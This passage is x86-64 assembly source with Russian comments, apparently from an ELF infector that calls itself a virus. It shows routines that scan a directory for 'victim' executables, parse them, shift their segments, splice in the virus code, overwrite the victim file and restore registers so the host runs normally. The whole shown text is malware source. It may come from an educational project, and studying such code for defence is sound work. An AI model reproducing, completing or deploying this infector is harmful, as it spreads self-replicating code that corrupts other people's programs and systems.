    jne     _move_segments_next

    // это первый загружаемый сегмент кода?
    mov     PHDR_P_OFFSET(%rdi), %rax
    test    %rax, %rax
    je      _move_first_segment

  _move_segment:
      mov     %rdi, cur_seg_hdr_ptr(%rip)
      call    _get_segm_addr_and_sz
      test    %rax, %rax
      jne     _move_segments_fail
  
      mov     cur_seg_end_addr(%rip), %rax
      cmp     %rax, dynamic_records_addr(%rip)
      jg      _no_dynamic_in_segm
      call    _my_memcpy
      test    %rax, %rax
      jne     _move_segments_fail
      
      jmp     _move_segments_next
  
  _no_dynamic_in_segm:
      call    _my_memcpy_without_bind_now_without_bind_now
      test    %rax, %rax
      jne     _move_segments_fail
  

_move_segments_next:
    add     $0x38, %rdi
    loop    _move_segments_cycle
    jmp     _move_segments_success

 // сдвигаем первый сегмент кода
 // он включает в себя заголовок эльфа и
 // таблицу заголовков сегментов, которые
 // сдвигать не надо - нам надо сдвинуть только
 // код жертвы, который начинается сразу после
 // таблицы заголовков
 
 _move_first_segment:
     mov     %rdi, cur_seg_hdr_ptr(%rip)
     call    _get_segm_addr_and_sz
     test    %rax, %rax
     jne     _move_segments_fail
 
     mov     cur_seg_addr(%rip), %rax
     mov     cur_seg_memsz(%rip), %rbx
 
     mov     victim_code_offset(%rip), %rdx
     sub     %rdx, %rbx  # размер сдвигаемого сегмента
     mov     %rbx, cur_seg_memsz(%rip)
     add     %rdx, %rax
     mov     %rax, cur_seg_addr(%rip)
 
     call    _my_memcpy_without_bind_now_without_bind_now
     test    %rax, %rax
     jne     _move_segments_fail
 
     jmp     _move_segments_next
 

 _move_segments_success:
    xor     %rax, %rax
    jmp     _move_segments_exit

_move_segments_fail:
    mov    $-1, %rax

_move_segments_exit:
    pop    %rdi
    pop    %rdx
    pop    %rbx
    pop    %rcx
    ret

/// _GET_MOVE_VICTIM_DATA
/// выгружает данные жертвы из блока данных
/// в переменные
_get_move_victim_data:
    push    %rdi

    leaq    _global_exit(%rip), %rdi
    test    %rdi, %rdi
    je      _get_move_victim_data_fail

    mov     NEW_BIND_NOW_FLAG_RECORD_SIZE(%rdi), %rax
    mov     %rax, new_bind_now_flag_record_size(%rip)

    mov     FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY(%rdi), %rax
    mov     %rax, frm_orig_e_entry_to_virus_e_entry_offset(%rip)

    mov     OFFSET_TO_E_ENTRY_FRM_FILE_BEGIN(%rdi), %rax
    mov     %rax, offset_to_e_entry_frm_file_begin(%rip)

    mov     FIRST_SEGM_VADDR(%rdi), %rax
    mov     %rax, first_seg_vaddr(%rip)

    mov     DYNAMIC_REC_VADDR(%rdi), %rax
    mov     %rax, dynamic_records_vaddr(%rip)

    mov     DYNAMIC_RECORDS_OFFSET(%rdi), %rax
    mov     %rax, dynamic_records_offset(%rip)

    mov     DYNAMIC_REC_SZ(%rdi), %rax
    mov     %rax, dynamic_records_size(%rip)

    mov     VICTIM_CODE_OFFSET(%rdi), %rax
    mov     %rax, victim_code_offset(%rip)

    mov     first_seg_vaddr(%rip), %rax
    mov     victim_code_offset(%rip), %rdi
    add     %rdi, %rax
    mov     %rax, victim_code_frm_begin_vaddr(%rip)

    movq    $-0x38, constant_value(%rip)

_get_move_victim_data_success:
    xor     %rax, %rax
    jmp     _get_move_victim_data_exit

_get_move_victim_data_fail:
    mov     $-1, %rax

_get_move_victim_data_exit:
    pop     %rdi
    ret

/// _EXIT_VIRUS
/// Аварийный выход из вируса
_exit_virus:
    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall

/// Сохраняет все регистры кроме rax -
/// он уже изменен - в переменные и
/// настраивает стек
/// Проверяет MPROTECT_OK
_save_registers:
    mov     mprotect_ok(%rip), %rax
    test    %rax, %rax
    jne     _save_registers_fail

    
    mov     %rsp, old_rsp(%rip)
    lea     _stack_bottom(%rip), %rsp
    
    mov     %rbx, old_rbx(%rip)
    mov     %rdx, old_rdx(%rip)
    mov     %rcx, old_rcx(%rip)
    mov     %rdi, old_rdi(%rip)
    mov     %r8, old_r8(%rip)
    mov     %r9, old_r9(%rip)
    mov     %r10, old_r10(%rip)
    mov     %r11, old_r11(%rip)
    mov     %r12, old_r12(%rip)
    mov     %r13, old_r13(%rip)
    mov     %r14, old_r14(%rip)
    mov     %r15, old_r15(%rip)

    xor     %rax, %rax
    jmp     _save_registers_exit

_save_registers_fail:
    mov     $-1, %rax

_save_registers_exit:
    jmp     _prepare_data

/// _START_INFECTOR
/// старт инфектора
_start_infector:
    call    _allow_write_into_code
    jmp     _save_registers

_prepare_data:
    call    _clear_old_data

    call    _my_readdir

_get_victim_name:
    call    _get_file_name
    test    %rax, %rax
    jne     _restore_registers_and_stack

    call    _print_infection_log

    call    _parse_victim
    test    %rax, %rax
    jnz     _get_victim_name

    call    _get_virus_code

    call    _recount_victim
    test    %rax, %rax
    jne     _restore_registers_and_stack

    call    _open_interm_file
    test    %rax, %rax
    jne     _restore_registers_and_stack

    call    _recombine_elf
    test    %rax, %rax
    jne     _restore_registers_and_stack

    call    _rewrite_to_victim_file
    test    %rax, %rax
    jne     _restore_registers_and_stack

    call    _print_success_infection_msg

/// Возвращает регистры в состояние
/// до исполнения вируса
_restore_registers_and_stack:
    mov     old_rsp(%rip), %rsp     # restore old %RSP
    mov     old_rbx(%rip), %rbx
    mov     old_rdx(%rip), %rdx
    mov     old_rcx(%rip), %rcx
    mov     old_rdi(%rip), %rdi
    mov     old_rsi(%rip), %rsi
    mov     old_r8(%rip), %r8
    mov     old_r9(%rip), %r9
    mov     old_r10(%rip), %r10
    mov     old_r11(%rip), %r11
    mov     old_r12(%rip), %r12
    mov     old_r13(%rip), %r13
    mov     old_r14(%rip), %r14
    mov     old_r15(%rip), %r15


/// выход из инфектора
_global_exit:
    mov $EXIT_SYSCALL, %rax
    mov $0x0,  %rdi
    syscall

_fin_infector:
    nop
